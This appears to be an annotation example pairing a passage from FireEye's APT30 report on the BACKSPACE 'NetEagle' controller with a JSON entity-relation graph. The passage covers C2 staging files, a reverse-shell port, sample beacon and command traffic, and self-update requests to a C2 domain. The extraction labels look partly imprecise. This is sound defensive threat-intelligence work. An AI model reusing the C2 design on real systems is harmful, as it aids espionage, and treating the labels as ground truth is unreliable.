@@ -1,0 +1,330 @@
+
+
+
+Sentence : A the GUI controller used to manage their
+BACKSPACE backdoors. FireEye analyzed three
+copies of the BACKSPACE controller software,
+known as the “NetEagle Remote Control System”
+6 (according to the version information from one
+sample) or 网络神鹰远程控制系统 (according
+to the “About” dialog box). Although the copies
+we analyzed were compiled in 2010, 2011, and
+2013 respectively, the tool’s descriptions indicate
+the original controller software may have been
+developed as early as 2004. [7]
+The BACKSPACE controller is a well-developed,
+full-featured GUI tool. The controller includes
+main menu items for “System”, “Network”, “File”,
+“Remote”, and “Attack” operations, in addition to
+the “About” dialog box. Information about victim
+hosts connected to the controller is displayed in
+the lower panes, including the hostname, internal
+and external IP addresses, system uptime, and OS
+version and language.
+Figure 2: Version information from BACKSPACE controller
+|Comments:|©2004 Microsoft Corporation. 保留所有权利。|
+|---|---|
+||Flyeagle science and technology company|
+||NetEagle Remote Control Software|
+|FileVersion:|4.2|
+|InternalName:|Neteagle|
+||版权所有 © 2004－永久|
+|||
+||NETEAGLE.EXE|
+|PrivateBuild:||
+||NetEagle Remote Control Software|
+||4.2|
+|SpecialBuild:||
+Figure 3: "About" dialog box from "NetEagle" BACKSPACE controller
+Many of APT30’s tools
+perform version checks and
+attempt to self-update.
+11
+SPECIAL REPORT APT30 and the Mechanics of a Long-Running Cyber Espionage Operation
+Figure 4: BACKSPACE controller GUI with sample victim data
+System      Network       File   Remote  Attack About
+Figure 5: BACKSPACE controller showing sample victim idle (top), and with remote control established (bottom)
+ESTABLISHING REMOTE CONTROL
+Communication with the stage two C2 server
+(e.g., the BACKSPACE controller) is managed
+via two files hosted on the stage one C2 server,
+dizhi.gif and connect.gif . BACKSPACE victim
+computers will retrieve dizhi.gif and transmit
+information about the victim computer (via HTTP
+POST) to the second stage IP address and port
+specified in that file. This victim information is
+used to populate the controller GUI (see Figure
+4). However, BACKSPACE clients do not establish
+interactive connections to the BACKSPACE
+controller by default, as this would increase the
+risk of exposing the second-stage C2 server.
+When a threat actor wants to establish
+remote control over a victim host, he uploads a
+notification file (e.g., connect.gif ) containing
+the victim hostname and host ID number to the
+stage one C2 server. Victim hosts will parse the
+connect.gif file retrieved from the server and
+connect to the BACKSPACE controller (using the
+data from dizhi.gif ) if their hostname and host
+ID are present in the file.
+12
+SPECIAL REPORT APT30 and the Mechanics of a Long-Running Cyber Espionage Operation
+Both dizhi.gif and connect.gif are generated
+by the BACKSPACE controller based on userdefined configuration settings and automatically
+uploaded to the stage one C2 server. This
+simplifies management of victim computers,
+reduces the risk of configuration errors, and
+allows even relatively unskilled operators to
+manage C2 infrastructure and victim hosts.
+The screen shot below shows the configuration
+options for the two files, including the FTP
+credentials used to connect to the stage one
+server, the path for the files, the names of the
+files, and the primary and backup stage one C2
+servers. These same configuration settings are
+used to customize a copy of the BACKSPACE
+malware, by “patching” the relevant bytes within
+the BACKSPACE binary.
+Similarly, a second dialogue box allows the threat
+actor to specify the ports (listed in dizhi.gif )
+used for communication with the second stage
+C2 server/BACKSPACE controller. The first port
+is used to transmit victim data via HTTP POST.
+The second port is used to establish an interactive
+connection with the BACKSPACE controller. The
+third port is used for a reverse command shell
+between the controller and the victim.
+Double-clicking an idle victim in the BACKSPACE
+controller GUI will automatically create (or
+update) connect.gif with that victim’s hostname
+and host ID and upload the new file to the stage
+one C2 server. The next time the victim parses the
+file, it will establish a connection to the controller.
+Figure 7:
+Dialog box for configuring ports
+for second stage C2
+13
+Figure 6:
+Configuration
+options for dizhi.gif
+and connect.gif
+SPECIAL REPORT APT30 and the Mechanics of a Long-Running Cyber Espionage Operation
+Figure 8:
+Sample victim host data
+sent to BACKSPACE
+controller
+```
+POST /index.htm HTTP/1.0
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
+HOST: 192.168.43.130:80
+Pragma: no-c ache
+Content-Length: 235
+Proxy-Connection: Keep-Alive
+USER-29861D99F7.192.168.43.133.............(......Service Pack
+3.........................................................................
+.....................................................N..1.0.p.18:32.www.stonehoof.
+com/ForZRMail..
+```
+BACKSPACE CONTROLLER – BACKDOOR
+COMMUNICATION
+The BACKSPACE controller uses a modified
+HTTP protocol to communicate with BACKSPACE
+clients on victim hosts. Victim hosts send data to
+the controller in HTTP POST format. When the
+controller receives the data, it ignores other HTTP
+headers and only parses the Content-Length
+value and the body data. No acknowledgement
+packet is sent back to the backdoor.
+The BACKSPACE controller sends remote
+command messages to BACKSPACE clients in
+the format below, disguised as a response from a
+Microsoft IIS 6.0 server. Similar to the controller,
+the BACKSPACE client only parses the Content-
+Length field and the remote command stored in
+the body and ignores other HTTP headers.
+Figure 9:
+Sample remote command sent from controller to
+BACKSPACE backdoor
+```
+ HTTP/1.1 200 OK
+Server: Microsoft-IIS6.0
+Content-Length: 12
+ Content-Type: /
+ Accept-Ranges: bytes
+ Connection: Keep-Alive
+B....C:*.*.
+```
+TARGET HOST PRIORITIZATION
+AND ALERTS
+The BACKSPACE controller allows the threat
+actors to further manage their victim hosts
+by labeling individual hosts with a comment,
+assigning a priority level to the victim (“Normal”,
+“Important”, or “Very Important”), and setting an
+alert to notify the threat actor when the victim
+host comes online.
+APT30 assigns a priority level to
+their victims: “Normal,” “Important,”
+and “Very Important.”
+Figure 10:
+Dialog box to set priority and other options on a
+victim host
+14
+SPECIAL REPORT APT30 and the Mechanics of a Long-Running Cyber Espionage Operation
+EXECUTING CUSTOM TASKS
+The BACKSPACE controller includes a menu
+item called “Automatically Execute Custom Task”
+(highlighted below) which sends the ‘O’ command
+supported by some variants of the BACKSPACE
+backdoor. [8] When the backdoor receives this
+command, it uploads data to the controller from
+predefined paths on the victim host ( $LDDATA$\
+and %WINDIR%\$NtUninstallKB900727$\ ).
+This special command appears to be used to
+retrieve stolen data from the victim computer
+in an automated fashion (as opposed to
+manually uploading files or directories). Of
+note is that these paths are found in other tools
+used by APT30 (specifically SPACESHIP and
+FLASHFLOOD) believed to be used to target airgapped computers and networks. [9]
+Below the “Automatically Execute Custom
+Task” menu item is another custom option for
+“GOTO custom path”. When selected, that menu
+item also directs the operator to a predefined
+custom path (one used by some versions of
+FLASHFLOOD) by default:
+VERSION CONTROL AND AUTOMATIC
+UPDATES
+Like many of the tools used by APT30, the
+BACKSPACE controller also performs a version
+check and attempts to self-update. The controller
+will transmit the following HTTP requests for
+a version file ( NetEagleVer.txt ) and updated
+binary ( NetEagle.exe ) when it starts.
+Figure 13: BACKSPACE controller version check
+and self-update
+```
+ GET /NE.General NetEagleVer.txt HTTP/1.1
+Accept: /
+User-Agent: HttpClient
+Host: www.km153.com
+GET /NE.General/NetEagle.exe HTTP/1.1
+Accept: /
+User-Agent: HttpClient
+Host: www.km153.com
+```
+Figure 12: BACKSPACE controller showing path used by other APT30 tools
+15
+SPECIAL REPORT APT30 and the Mechanics of a Long-Running Cyber Espionage Operation
+Figure 14:
+Encoded disk serial
+numbers in the
+BACKSPACE
+controller binary
+DISK SERIAL NUMBER AUTHENTICATION
+The BACKSPACE controller also includes a
+check to ensure that the controller is only run on
+authorized machines. The controller compares
+the local host’s hard disk serial number with
+45 encoded serial numbers hardcoded within
+the controller binary, and continues execution
+only if there is a match. This indicates that the
+developers of the controller wanted to limit its
+distribution and use. The developers could have
+written the controller for themselves; alternately,
+the controller could have been sold with built-in
+restrictions so the developers could continue to
+write and sell custom versions to others. [10] Given
+the tightly integrated nature of much of APT30’s
+malware (with each other and with the controller)
+and the fact that the controllers themselves use
+APT30 domains to perform self-update checks,
+it seems more likely that APT30 (or a group of
+developers closely aligned with them) created the
+controller for their own use.
+APT30 POSSIBLY WORKING ON SHIFTS
+In our analysis of the BACKSPACE controller, we
+identified a dialog box in the portable executable
+(PE) resource section. The dialog box included a
+login prompt with the text 请输入您的值班员代号,
+which translates to “Please enter your attendant
+code”. This suggests the tool may have been
+designed to track work shifts amongst multiple
+operators, although this particular feature was
+disabled in the sample we analyzed.
+The history of the BACKSPACE controller
+(possibly written as early as 2004, and still
+compatible with BACKSPACE variants
+compiled within the past year) reflects a tool
+developed over time and designed to facilitate
+detailed interaction with victim hosts through a
+relatively simple interface. The tool is capable
+of supporting interaction with a large number
+Figure 15:
+BACKSPACE controller “attendant” dialog box
+of victim hosts, and includes features to
+allow the operator to filter, prioritize, alert
+on, and otherwise manage his or her victims,
+implying operations large enough to warrant
+such features. The controller exhibits the same
+diligent version control and self-updating features
+observed in other malware used by APT30. In
+addition, the serial number checks built in to
+the BACKSPACE controller imply a very limited
+distribution tool designed to be used by only a
+select number of users. Finally, the “attendant”
+dialog box implies that the controller itself may
+have been designed for use in a highly organized
+environment. All of these factors point to a threat
+group with long-term, organized, and structured
+development resources; a need to manage and
+track a potentially large number of victims over
+time; and an organized work force responsible
+for carrying out the group’s objectives.
+16
+SPECIAL REPORT APT30 and the Mechanics of a Long-Running Cyber Espionage Operation
+APT30’S PRIMARY MISSION:
+Data Theft for Political Gain
+ased on our knowledge of APT30's targeting
+activity and tools, their objective appears
+Output : 
+{
+    "nodes": [
+        {"id": 1, "description": "BACKSPACE backdoors", "type" : "EXEF"},
+        {"id": 2, "description": "NetEagle Remote Control System (v4.2)", "type" : "APPS"},
+        {"id": 3, "description": "系统、网络、文件、远程、攻击、关于 (System, Network, File, Remote, Attack, About) operations", "type" : "TTPS"},
+        {"id": 4, "description": "victim host information (hostname, internal and external IP addresses, system uptime, OS version and language)", "type" : "REGI"},
+        {"id": 5, "description": "dizhi.gif", "type" : "DOCF"},
+        {"id": 6, "description": "connect.gif", "type" : "DOCF"},
+        {"id": 7, "description": "stage one C2 server", "type" : "CCSH"},
+        {"id": 8, "description": "stage two C2 server (BACKSPACE controller)", "type" : "CCSH"},
+        {"id": 9, "description": "FTP credentials used to connect to the stage one server", "type" : "TAMP"},
+        {"id": 10, "description": "victim hostname and host ID number", "type" : "REGI"},
+        {"id": 11, "description": "HTTP POST request (to send victim data)", "type" : "NETP"},
+        {"id": 12, "description": "reverse command shell between the controller and the victim", "type" : "TTPS"},
+        {"id": 13, "description": "$LDDATA$\\ and %WINDIR%\\$NtUninstallKB900727$", "type" : "SYSP"},
+        {"id": 14, "description": "custom path (one used by some versions of FLASHFLOOD)", "type" : "TAMP"},
+        {"id": 15, "description": "NetEagleVer.txt", "type" : "DOCF"},
+        {"id": 16, "description": "NetEagle.exe", "type" : "EXEF"},
+        {"id": 17, "description": "45 encoded serial numbers hardcoded within the controller binary", "type" : "REGI"},
+        {"id": 18, "description": "请输入您的值班员代号 (Please enter your attendant code)", "type" : "TAMP"}
+    ],
+    "edges": [
+        {"source": 2, "target": 3, "rel_name" : "includes operations for"},
+        {"source": 2, "target": 4, "rel_name" : "collects information from"},
+        {"source": 5, "target": 7, "rel_name" : "sent to"},
+        {"source": 6, "target": 7, "rel_name" : "sent to"},
+        {"source": 5, "target": 8, "rel_name" : "used by"},
+        {"source": 6, "target": 8, "rel_name" : "used by"},
+        {"source": 9, "target": 7, "rel_name" : "used to connect to"},
+        {"source": 10, "target": 6, "rel_name" : "included in"},
+        {"source": 4, "target": 8, "rel_name" : "sent to"},
+        {"source": 11, "target": 8, "rel_name" : "used by"},
+        {"source": 12, "target": 8, "rel_name" : "establishes"},
+        {"source": 13, "target": 2, "rel_name" : "accessed by"},
+        {"source": 14, "target": 2, "rel_name" : "accessed by"},
+        {"source": 15, "target": 8, "rel_name" : "requested by"},
+        {"source": 16, "target": 8, "rel_name" : "requested by"},
+        {"source": 17, "target": 2, "rel_name" : "compares with"}
+    ]
+}
